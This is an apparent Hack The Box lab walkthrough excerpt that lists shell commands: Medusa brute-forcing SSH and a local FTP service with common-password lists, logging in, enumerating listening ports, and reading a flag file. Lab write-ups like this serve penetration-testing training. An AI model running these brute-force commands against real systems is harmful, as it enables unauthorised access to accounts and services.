...
```shell-session
frank-106@htb[/htb]$ medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```
...
```shell-session
frank-106@htb[/htb]$ ssh sshuser@<IP> -p PORT
```
...
```shell-session
frank-106@htb[/htb]$ netstat -tulpn | grep LISTEN
...
```shell-session
frank-106@htb[/htb]$ nmap localhost
...
```shell-session
frank-106@htb[/htb]$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
...
```shell-session
frank-106@htb[/htb]$ ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
...
```shell-session
frank-106@htb[/htb]$ cat flag.txt
HTB{...}
```
